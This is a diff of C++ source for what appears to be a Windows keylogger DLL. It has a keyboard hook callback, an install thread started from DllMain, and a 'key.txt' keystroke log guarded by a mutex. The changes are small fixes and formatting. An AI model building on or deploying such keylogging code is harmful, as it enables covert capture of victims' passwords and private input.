@@ -50,12 +50,14 @@ LRESULT CALLBACK kbproc(
 
 	if (result == WAIT_OBJECT_0)
 	{
-		if (toerase) {
+		if (toerase)
+		{
 			file_out.close();
 			file_in.close();
 			remove("key.txt");
 			file_out.open("key.txt");
 			file_in.open("key.txt");
+			toerase = false;
 		}
 
 		if (wparam == WM_KEYDOWN)
@@ -92,10 +94,7 @@ int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
 			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
 			toerase = false;
 			//add_log("Attached.");
-			mutex = CreateMutex(
-					NULL,                       // default security attributes
-					FALSE,                      // initially not owned
-					NULL);
+			mutex = CreateMutex(NULL, FALSE, NULL);
 			break;
 		case DLL_PROCESS_DETACH:
 			std::cout << "Processe unattached" << std::endl;
@@ -129,7 +128,7 @@ int getElements(std::list<std::string>& list)
 	DWORD result;
 
 	result = WaitForSingleObject(mutex, INFINITE);
-
+	std::cout << "GO" << std::endl;
 	if (result == WAIT_OBJECT_0)
 	{
 		std::string buffer;
